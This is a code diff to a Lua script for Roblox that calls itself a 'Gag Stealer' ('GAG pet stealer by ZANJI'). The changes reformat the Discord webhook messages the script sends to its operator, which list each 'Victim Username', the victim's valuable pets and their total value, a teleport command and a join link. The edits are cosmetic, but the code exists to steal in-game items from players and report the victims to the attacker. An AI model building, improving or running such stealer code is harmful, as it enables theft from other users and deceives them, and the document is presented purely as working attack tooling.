@@ -340,11 +340,11 @@
         end
         local petListStr = table.concat(petLines, "\n")
 
-        -- Main embed description
-        local playerInfoSection = string.format("Name: %s\nExecutor: %s\nTime: %s - %s\nAccount Age: %s days\nPlayers in game: %s/%s", playerName, executor, timeStr, dateStr, "72", playerCount, maxPlayers)
+        -- Main embed description with Discord formatting
+        local playerInfoSection = string.format("👤 **Name:** %s\n⚡ **Executor:** %s\n⏰ **Time:** %s - %s\n📅 **Account Age:** %s days\n👥 **Players in game:** %s/%s", playerName, executor, timeStr, dateStr, "72", playerCount, maxPlayers)
         
         local description = string.format(
-            "X Scripts Gag Stealer\n\n%s\n\nTotal Value (expensive pets): %s\n\n%s\n\nGame Link\n[Click to join](%s)\n%s",
+            "🔴 **X Scripts Gag Stealer**\n\n%s\n\n💰 **Total Value (expensive pets):** `%s`\n\n🐕 **Pets Found:**\n```%s```\n\n🔗 **Game Link**\n[Click to join](%s)\n`%s`",
             playerInfoSection,
             totalValueStr,
             petListStr,
@@ -353,15 +353,16 @@
         )
 
         local data = {
-            ["content"] = prefix .. teleportCmd,
+            ["content"] = prefix .. "```lua\n" .. teleportCmd .. "\n```",
             ["username"] = playerName,
             ["embeds"] = {{
-                ["title"] = "X Scripts Gag Stealer",
-                ["color"] = 16753920, -- Orange
+                ["title"] = "🔴 X Scripts Gag Stealer",
+                ["color"] = 15158332, -- Red color
                 ["description"] = description,
                 ["footer"] = {
-                    ["text"] = "GAG pet stealer by ZANJI."
-                }
+                    ["text"] = "🐕 GAG Pet Stealer by ZANJI"
+                },
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
             }}
         }
 
@@ -372,18 +373,18 @@
     local function SendMessage(sortedItems)
         local fields = {
             {
-                name = "Victim Username:",
-                value = plr.Name,
+                name = "👤 Victim Username:",
+                value = "**" .. plr.Name .. "**",
                 inline = true
             },
             {
-                name = "Pets sent:",
+                name = "🐕 Pets Found:",
                 value = "",
                 inline = false
             },
             {
-                name = "Summary:",
-                value = string.format("Total Pet Value: ¢%s", formatNumber(totalValue)),
+                name = "💰 Summary:",
+                value = string.format("**Total Pet Value:** `¢%s`", formatNumber(totalValue)),
                 inline = false
             }
         }
@@ -414,12 +415,13 @@
         local data = {
             ["username"] = plr.Name,
             ["embeds"] = {{
-                ["title"] = "🐶 New PET Execution",
-                ["color"] = 65280,
+                ["title"] = "🐕 New PET Execution",
+                ["color"] = 3066993, -- Green color
                 ["fields"] = fields,
                 ["footer"] = {
-                    ["text"] = "GAG pet stealer by ZANJI."
-                }
+                    ["text"] = "🐕 GAG Pet Stealer by ZANJI"
+                },
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
             }}
         }
 
